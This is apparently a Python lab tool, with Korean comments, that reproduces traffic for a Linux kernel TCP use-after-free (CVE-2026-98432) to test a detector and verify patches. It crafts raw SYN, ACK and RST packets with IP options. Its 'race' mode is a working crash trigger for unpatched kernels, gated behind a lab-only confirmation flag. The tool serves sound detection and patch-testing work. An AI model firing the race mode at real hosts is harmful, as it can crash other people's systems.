#!/usr/bin/env python3
"""tcp_race_reproducer.py - CVE-2026-98432 검증용 트래픽 리프로듀서

탐지 도구 검증 및 패치 효과 검증(실험실 전용)을 위해 공격 전제 패턴만을
재현한다. 익스플로잇 페이로드·정보 유출·권한 상승 기능은 없다.

  smoke  : 옵션 부착 SYN을 독립 발송 (탐지 S1 검증) - 안전
  groom  : 동일 seq SYN 고빈도 재전송 (탐지 S2/race_grooming 검증) - 안전
  race   : 핸드셰이크 완료+파괴와 SYN 재전송을 동시 수행 (UAF 레이스 창 유도)
           미패치 커널에서 커널 크래시를 유발할 수 있음. 반드시 격리 VM에서만.

필수: Linux + root(CAP_NET_RAW). 순수 표준 라이브러리.
"""

import argparse
import random
import socket
import struct
import sys
import threading
import time

TCP_SYN = 0x02
TCP_ACK = 0x10
TCP_RST = 0x04
TCP_SYNACK = TCP_SYN | TCP_ACK

IPOPT_EOL = 0
IPOPT_NOP = 1


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def tcp4_checksum(src, dst, tcp_seg):
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src),
                         socket.inet_aton(dst), 0, 6, len(tcp_seg))
    return checksum(pseudo + tcp_seg)


def build_tcp(sport, dport, seq, ack, flags, window=65535):
    offs_res = 5 << 4
    hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, offs_res,
                      flags, window, 0, 0)
    return hdr


def build_ip(src, dst, proto, payload, opts=b"", ident=1, ttl=64):
    assert len(opts) % 4 == 0
    ihl = 5 + len(opts) // 4
    tot = 20 + len(opts) + len(payload)
    vihl = (4 << 4) | ihl
    hdr = struct.pack("!BBHHHBBH4s4s", vihl, 0, tot, ident, 0x4000,
                      ttl, proto, 0, socket.inet_aton(src),
                      socket.inet_aton(dst))
    return hdr + opts + payload


def pad_opts(opts):
    while len(opts) % 4:
        opts += bytes([IPOPT_NOP])
    return opts


def rr_option(ptr=4):
    return bytes([7, 3, ptr])


def ts_option(fill=None):
    payload = fill if fill else bytes(random.getrandbits(8) for _ in range(6))
    return bytes([68, 8]) + payload


def lsrr_option():
    return bytes([131, 7, 4]) + socket.inet_aton("127.0.0.1")


def ssrr_option():
    return bytes([137, 7, 4]) + socket.inet_aton("127.0.0.1")


def build_options(spec):
    out = b""
    for name in spec.split(","):
        name = name.strip().lower()
        if not name:
            continue
        if name == "rr":
            out += rr_option()
        elif name == "ts":
            out += ts_option()
        elif name == "lsrr":
            out += lsrr_option()
        elif name == "ssrr":
            out += ssrr_option()
        else:
            raise SystemExit("unknown option type: %s (rr,ts,lsrr,ssrr)" % name)
    return pad_opts(out)


def build_syn_pkt(src, dst, sport, dport, isn, opts):
    tcp = build_tcp(sport, dport, isn, 0, TCP_SYN)
    csum = tcp4_checksum(src, dst, tcp)
    tcp = tcp[:16] + struct.pack("!H", csum) + tcp[18:]
    return build_ip(src, dst, 6, tcp, opts)


def build_ack_pkt(src, dst, sport, dport, seq, ack):
    tcp = build_tcp(sport, dport, seq, ack, TCP_ACK)
    csum = tcp4_checksum(src, dst, tcp)
    tcp = tcp[:16] + struct.pack("!H", csum) + tcp[18:]
    return build_ip(src, dst, 6, tcp)


def build_rst_pkt(src, dst, sport, dport, seq, ack):
    tcp = build_tcp(sport, dport, seq, ack, TCP_RST | TCP_ACK)
    csum = tcp4_checksum(src, dst, tcp)
    tcp = tcp[:16] + struct.pack("!H", csum) + tcp[18:]
    return build_ip(src, dst, 6, tcp)


def parse_ip_tcp(data):
    if len(data) < 40:
        return None
    vihl = data[0]
    if vihl >> 4 != 4:
        return None
    ihl = (vihl & 0x0F) * 4
    if data[9] != 6 or len(data) < ihl + 20:
        return None
    src = socket.inet_ntoa(data[12:16])
    dst = socket.inet_ntoa(data[16:20])
    tcp = data[ihl:]
    sport, dport = struct.unpack("!HH", tcp[0:4])
    seq, ack = struct.unpack("!II", tcp[4:12])
    flags = tcp[13]
    return {"src": src, "dst": dst, "sport": sport, "dport": dport,
            "seq": seq, "ack": ack, "flags": flags}


def local_ip_for(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    finally:
        s.close()


class SynSender:
    def __init__(self, src, dst, dport, sport_base):
        self.src = src
        self.dst = dst
        self.dport = dport
        self.sport_base = sport_base
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_RAW)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        self.recv = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        self.recv.settimeout(0.5)

    def send(self, pkt):
        self.sock.sendto(pkt, (self.dst, 0))

    def recv_synack(self, sport):
        deadline = time.time() + 1.0
        while time.time() < deadline:
            try:
                data = self.recv.recv(65535)
            except socket.timeout:
                return None
            p = parse_ip_tcp(data)
            if p and p["sport"] == self.dport and p["dport"] == sport \
                    and (p["flags"] & TCP_SYNACK) == TCP_SYNACK \
                    and p["dst"] == self.src:
                return p
        return None

    def close(self):
        try:
            self.sock.close()
            self.recv.close()
        except OSError:
            pass


def mode_smoke(args, sender, opts):
    for i in range(args.count):
        sport = args.sport_base + i
        isn = random.getrandbits(32)
        sender.send(build_syn_pkt(sender.src, sender.dst, sport,
                                  sender.dport, isn, opts))
        synack = sender.recv_synack(sport)
        if synack:
            sender.send(build_rst_pkt(sender.src, sender.dst, sport,
                                      sender.dport, isn + 1, synack["seq"] + 1))
            print("smoke %d: sport=%d SYN->SYNACK->RST ok" % (i, sport))
        else:
            print("smoke %d: sport=%d no SYNACK (listener alive?)" % (i, sport))
        if args.delay:
            time.sleep(args.delay)


def mode_groom(args, sender, opts):
    sport = args.sport_base
    isn = random.getrandbits(32)
    syn = build_syn_pkt(sender.src, sender.dst, sport, sender.dport, isn, opts)
    sender.send(syn)
    if not sender.recv_synack(sport):
        print("groom: no SYNACK for initial SYN")
        return
    for k in range(args.retx):
        sender.send(syn)
        if args.delay:
            time.sleep(args.delay)
    print("groom: sent %d same-seq optioned SYN retransmits (sport=%d)"
          % (args.retx, sport))


def mode_race_iteration(args, sender, opts, sport, ident):
    isn = random.getrandbits(32)
    syn = build_syn_pkt(sender.src, sender.dst, sport, sender.dport, isn, opts)
    sender.send(syn)
    synack = sender.recv_synack(sport)
    if not synack:
        return False
    ack = build_ack_pkt(sender.src, sender.dst, sport, sender.dport,
                        isn + 1, synack["seq"] + 1)
    rst = build_rst_pkt(sender.src, sender.dst, sport, sender.dport,
                        isn + 1, synack["seq"] + 1)
    sender.send(syn)
    sender.send(ack)
    sender.send(rst)
    for _ in range(args.retx):
        sender.send(syn)
    return True


def worker_race(args, opts, thread_id, results):
    sender = SynSender(args.src, args.dst, args.dport, args.sport_base)
    ok = 0
    try:
        for i in range(args.iterations):
            sport = args.sport_base + thread_id * args.iterations + i
            if mode_race_iteration(args, sender, opts, sport, i):
                ok += 1
    finally:
        sender.close()
    results[thread_id] = ok


def mode_race(args, opts):
    results = {}
    threads = []
    for t in range(args.threads):
        th = threading.Thread(target=worker_race,
                              args=(args, opts, t, results))
        th.start()
        threads.append(th)
    for th in threads:
        th.join()
    total = sum(results.values())
    print("race: %d/%d handshake+destroy cycles completed"
          % (total, args.threads * args.iterations))


def selftest():
    results = []

    def check(name, cond):
        results.append((name, bool(cond)))

    check("checksum empty -> 0xFFFF", checksum(b"") == 0xFFFF)
    check("checksum vector [0x01,0x00,0x02,0x00] -> 0xFCFF",
          checksum(b"\x01\x00\x02\x00") == 0xFCFF)

    src, dst = "10.0.0.1", "192.168.0.1"
    opts = pad_opts(rr_option() + ts_option(b"\x01" * 6))
    check("options padded to 4B", len(opts) % 4 == 0 and len(opts) == 12)

    tcp = build_tcp(40000, 443, 0xDEADBEEF, 0, TCP_SYN)
    csum = tcp4_checksum(src, dst, tcp)
    seg = tcp[:16] + struct.pack("!H", csum) + tcp[18:]
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src),
                         socket.inet_aton(dst), 0, 6, len(seg))
    check("tcp4_checksum self-consistent", checksum(pseudo + seg) == 0)

    pkt = build_ip(src, dst, 6, seg, opts)
    check("IP total length", struct.unpack("!H", pkt[2:4])[0] == len(pkt))
    check("IP IHL with options", (pkt[0] & 0x0F) == 8)

    try:
        import importlib.util
        spec = importlib.util.spec_from_file_location(
            "tcpopt_syn_detector",
            __file__.rsplit("/", 2)[0] + "/detector/tcpopt_syn_detector.py")
        det = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(det)
        eth = (b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" +
               struct.pack("!H", 0x0800) + pkt)
        parsed = det.parse_frame(eth)
        check("detector parses our SYN frame",
              parsed is not None and (parsed["flags"] & TCP_SYN)
              and parsed["ipopts"] == opts)
        alerts = det.Detector().feed(parsed, 1000.0)
        check("detector raises syn_ipopt on our frame",
              any(a["event"] == "syn_ipopt" and a["opt_types"] == [7, 68]
                  for a in alerts))
    except Exception as e:
        check("detector cross-check (import failed: %s)" % e, False)

    ok = True
    for name, passed in results:
        print("PASS" if passed else "FAIL", "-", name)
        ok = ok and passed
    return 0 if ok else 1


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-98432 lab-only race traffic reproducer")
    ap.add_argument("--target", default="127.0.0.1:4444")
    ap.add_argument("--src", help="source IP (default: auto)")
    ap.add_argument("--mode", choices=["smoke", "groom", "race"],
                    default="smoke")
    ap.add_argument("--opt-types", default="rr,ts")
    ap.add_argument("--count", type=int, default=10,
                    help="smoke: number of independent SYNs")
    ap.add_argument("--retx", type=int, default=8,
                    help="groom/race: retransmit count per iteration")
    ap.add_argument("--iterations", type=int, default=50,
                    help="race: iterations per thread")
    ap.add_argument("--threads", type=int, default=4, help="race: parallel flows")
    ap.add_argument("--sport-base", type=int, default=40000)
    ap.add_argument("--delay", type=float, default=0.0,
                    help="inter-packet delay (s)")
    ap.add_argument("--confirm-lab", choices=["ISOLATED-LAB-ONLY"],
                    help="race 모드 실행 조건: 격리된 실험실 VM에서만 사용한다는 확인")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()

    if args.selftest:
        sys.exit(selftest())

    if args.mode == "race" and args.confirm_lab != "ISOLATED-LAB-ONLY":
        print("race 모드는 미패치 커널에서 커널 UAF/크래시를 유발할 수 있습니다.",
              file=sys.stderr)
        print("격리된 실험실 VM에서만 실행하고 --confirm-lab ISOLATED-LAB-ONLY 를"
              " 지정하세요.", file=sys.stderr)
        return 2

    dst, _, dport = args.target.rpartition(":")
    dport = int(dport)
    src = args.src or local_ip_for(dst)

    print("target %s:%d src=%s mode=%s opt-types=%s"
          % (dst, dport, src, args.mode, args.opt_types))
    print("WARNING: 실험실(격리 VM/루프백)에서만 사용하십시오. "
          "프로덕션 대상에 절대 사용하지 마십시오.")

    opts = build_options(args.opt_types)
    sender = SynSender(src, dst, dport, args.sport_base)
    try:
        if args.mode == "smoke":
            mode_smoke(args, sender, opts)
        elif args.mode == "groom":
            mode_groom(args, sender, opts)
        else:
            mode_race(args, opts)
    finally:
        sender.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
